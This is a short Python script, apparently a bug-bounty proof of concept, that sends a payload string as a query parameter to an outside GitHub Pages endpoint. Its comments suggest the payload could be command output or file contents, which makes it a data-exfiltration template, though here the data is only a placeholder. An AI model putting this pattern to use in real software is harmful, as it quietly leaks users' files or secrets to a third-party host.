import requests

# Define your GitHub Pages URL (with the payload as a query parameter)
url = "https://vedanthackerone.github.io/bullfrog/?data="  # Use your GitHub Pages URL

# Your payload data (this could be anything, e.g., command output or file content)
payload = "example_payload_data"

# Send the GET request with the payload
response = requests.get(url + payload)

# Print the status code (optional, for debugging)
print(response.status_code)
